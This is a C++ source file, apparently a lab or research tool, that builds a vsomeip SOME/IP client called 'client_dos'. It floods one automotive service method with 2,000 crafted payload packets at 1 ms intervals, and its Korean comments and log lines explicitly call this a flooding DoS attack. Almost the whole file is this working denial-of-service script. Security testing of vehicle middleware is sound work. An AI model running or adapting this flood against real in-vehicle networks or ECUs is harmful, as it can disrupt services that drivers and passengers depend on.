#include <vsomeip/vsomeip.hpp>
#include <iostream>
#include <thread>
#include <chrono>
#include <cstring> // for memcpy

std::shared_ptr<vsomeip::application> app;

const vsomeip::service_t service_id = 0x1234;
const vsomeip::instance_t instance_id = 0x5678;
const vsomeip::method_t method_id = 0x0421;

#pragma pack(push, 1) // 메모리 패딩 없이 정렬
struct custom_payload_t {
    uint32_t a;
    float b[2];
    uint32_t d;
    float e[2];
    uint8_t f;
};
#pragma pack(pop)

void send_dos_requests() {
    for (int i = 0; i < 2000; ++i) {
        custom_payload_t payload_data;

        // 값을 다양하게 바꿔서 flooding 효과
        payload_data.a = i;
        payload_data.b[0] = static_cast<float>(i) * 0.1f;
        payload_data.b[1] = static_cast<float>(i) * 0.2f;
        payload_data.d = i + 100;
        payload_data.e[0] = static_cast<float>(i) * 0.3f;
        payload_data.e[1] = static_cast<float>(i) * 0.4f;
        payload_data.f = static_cast<uint8_t>(i % 256);

        std::shared_ptr<vsomeip::payload> pl = vsomeip::runtime::get()->create_payload();
        pl->set_data(reinterpret_cast<vsomeip::byte_t*>(&payload_data), sizeof(payload_data));

        std::shared_ptr<vsomeip::message> request = vsomeip::runtime::get()->create_request();
        request->set_service(service_id);
        request->set_instance(instance_id);
        request->set_method(method_id);
        request->set_payload(pl);

        std::cout << "[client_dos] Sending crafted packet " << i << std::endl;
        app->send(request);

        std::this_thread::sleep_for(std::chrono::milliseconds(1)); // 1ms 간격
    }
}

int main() {
    app = vsomeip::runtime::get()->create_application("client_dos");

    if (!app->init()) {
        std::cerr << "Failed to initialize client_dos app." << std::endl;
        return 1;
    }

    app->request_service(service_id, instance_id); // 서비스 요청

    // DoS 전송을 별도 스레드에서 실행
    std::thread flood_thread(send_dos_requests);

    std::cout << "[client_dos] Starting Flooding DoS attack..." << std::endl;

    app->start(); // 이거는 블로킹 함수 → 이후 코드가 실행 안 됨

    flood_thread.join(); // 프로그램이 끝나지 않도록 유지
    return 0;
}

